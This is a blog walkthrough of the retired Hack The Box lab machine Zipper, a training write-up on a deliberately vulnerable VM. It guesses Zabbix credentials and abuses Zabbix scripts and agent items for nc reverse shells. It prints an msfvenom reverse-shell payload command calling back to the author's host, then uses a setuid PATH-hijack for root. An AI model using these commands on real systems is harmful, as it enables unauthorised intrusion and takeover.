---
layout: post
title: "Zipper: Hack The Box Walkthrough"
date: 2019-02-23 15:51:19 +0000
last_modified_at: 2019-02-23 15:51:47 +0000
category: Walkthrough
tags: ["Hack The Box", Zipper, retired]
comments: true
image:
  feature: zipper-htb-walkthrough.jpg
  credit: Uki_71 / Pixabay
  creditlink: https://pixabay.com/en/zip-jeans-clothing-close-up-metal-1686633/
---

This post documents the complete walkthrough of Zipper, a retired vulnerable [VM][1] created by [burmat][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Zipper is retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -T5 -oN nmap.txt 10.10.10.108
...
PORT      STATE SERVICE       REASON         VERSION
22/tcp    open  ssh           syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)                 
| ssh-hostkey:
|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)
|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)
|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)
80/tcp    open  http          syn-ack ttl 62 Apache/2.4.29 (Ubuntu)
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10050/tcp open  zabbix-agent? syn-ack ttl 63
```

`nmap` finds `22/tcp` and `80/tcp` open. Nothing unusual. In any case, let's enumerate the `http` service further.

### Directory/File Enumeration

As usual, my first goto tool is `wfuzz`. The wordlist I'm using is SecLists' `quickhits.txt`.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --hc '403,404' http://10.10.10.108/FUZZ
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.108/FUZZ
Total requests: 2371

==================================================================
ID      Response   Lines      Word         Chars          Payload    
==================================================================

002365:  C=200     31 L      188 W         3105 Ch        "/zabbix/"

Total time: 79.53206
Processed Requests: 2371
Filtered Requests: 2370
Requests/sec.: 29.81187
```

Hmm, interesting. This is how it looks like.


{% include image.html image_alt="688737d1.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/688737d1.png" %}


Hmm. Guest login is allowed.


{% include image.html image_alt="56758d40.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/56758d40.png" %}


I knew I had to try my luck at the login when I saw Zapper's Backup Script.


{% include image.html image_alt="755eae7f.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/755eae7f.png" %}


I tried (`zapper:zapper`).


{% include image.html image_alt="c0c5384c.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/c0c5384c.png" %}


And this is the result.


{% include image.html image_alt="4ee00943.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/4ee00943.png" %}


A quick check with Zabbix 3.0 documentation reveals that GUI access although enabled by default, can be disabled. Alternatively, one can still access the Zabbix server through the web-based application programming interface (or [API](https://www.zabbix.com/documentation/3.0/manual/api)). In fact, the Zabbix CLI Tools [Wiki](https://zabbix.org/wiki/Zabbix_CLI_Tools) provides links to a couple of Zabbix CLI tools that allows us to interact with the Zabbix server through a text-based interface.

I've chosen `zabbix-cli` simply because it's available in the Kali repository. The instructions to install, configure `zabbix-cli` is beyond the scope of this write-up.


{% include image.html image_alt="7ef55747.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/7ef55747.png" %}


Voila. I have access to the Zabbix server.


{% include image.html image_alt="6b6aba6e.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/6b6aba6e.png" %}


I'll create a user and place it at the "Zabbix administrators" user group, where GUI access is allowed.


{% include image.html image_alt="8ab1c558.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/8ab1c558.png" %}


I created a user `ironman` with the password `marvelstud10s`.


{% include image.html image_alt="065bc9a5.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/065bc9a5.png" %}


There you have it. The good thing about Zabbix is the ability to create and run scripts.


{% include image.html image_alt="c901f164.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/c901f164.png" %}


Let's create a reverse shell script with `nc` like so.


{% include image.html image_alt="a3ea4dc4.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/a3ea4dc4.png" %}


The script can be triggered by clicking on any host to bring up the context menu like so.


{% include image.html image_alt="a26f8031.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/a26f8031.png" %}


I have shell. Too bad it's a shell to the Zabbix server container.


{% include image.html image_alt="e4d85da0.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/e4d85da0.png" %}


I wonder what this means.


{% include image.html image_alt="1b94fe82.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/1b94fe82.png" %}


Anyway, I found a `/backups` directory containing two password-protected 7-zip files.


{% include image.html image_alt="7dcee928.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/7dcee928.png" %}


I also found a copy of `backup_script.sh` lying around.


{% include image.html image_alt="ef6a93a3.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/ef6a93a3.png" %}


The password is in `backup_script.sh`!


{% include image.html image_alt="db8e3bd0.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/db8e3bd0.png" %}


Let's keep the password in mind. It might be useful later.

## Low-Privilege Shell

I found the key to getting a low-privilege shell while exploring the Zabbix server. I noticed that there's a host Zipper installed with a Zabbix Agent, and one can create an item to instruct the agent to run system commands like so!


{% include image.html image_alt="f37793ae.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/f37793ae.png" %}


I generated a reverse shell with `msfvenom`. Prior to this, I've experimented with various commands and verified that the host is running 32-bit Ubuntu. Next, to facilitate transfer of the reverse shell, I host the executable with Python's SimpleHTTPServer.

```
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.13.52 LPORT=4321 -f elf -o rev
# python -m SimpleHTTPServer 80
```

The moment I caught the reverse shell, I immediately deleted the item to prevent the command from running again.


{% include image.html image_alt="ae58be7b.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/ae58be7b.png" %}


Let's upgrade the shell to a full TTY since Python 3 is available.


{% include image.html image_alt="c494c229.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/c494c229.png" %}


I'm in Zipper alright! Recall the password earlier? Let's see if we can `su` to `zapper`.


{% include image.html image_alt="22f6a11b.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/22f6a11b.png" %}


Perfect. `user.txt` is in `zapper`'s home directory.


{% include image.html image_alt="10518a8d.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/10518a8d.png" %}


## Privilege Escalation

During enumeration of `zapper`'s account, I notice a `setuid` executable at `/home/zapper/utils`.


{% include image.html image_alt="5450d341.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/5450d341.png" %}


The privilege escalation is pretty straight forward. The executable uses `system(3)` library function to run `systemctl`. It's the classic Linux executable search path attack. Check out the path to `systemctl` and the `$PATH` environment variable.


{% include image.html image_alt="094663d5.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/094663d5.png" %}


The `system(3)` library function essentially searches for `systemctl` in the first path that it finds. What happens if we place a malicious `systemctl` executable in a path we control? Privilege escalation!

Let's write a malicious `systemctl` like so.


{% include image.html image_alt="52c8fe46.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/52c8fe46.png" %}


Compile the code with `gcc` and export `PATH` with `/tmp` as the first path to search.


{% include image.html image_alt="ce130c84.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/ce130c84.png" %}


Executing `zabbix-service` is all that's left to be `root`.


{% include image.html image_alt="4154a6f6.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/4154a6f6.png" %}


Getting `root.txt` is trivial with a `root` shell.


{% include image.html image_alt="6a5f402a.png" image_src="/736c413d-3bf5-4f8a-811e-5780357787d0/6a5f402a.png" %}


:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/159
[2]: https://www.hackthebox.eu/home/users/profile/1453
[3]: https://www.hackthebox.eu/
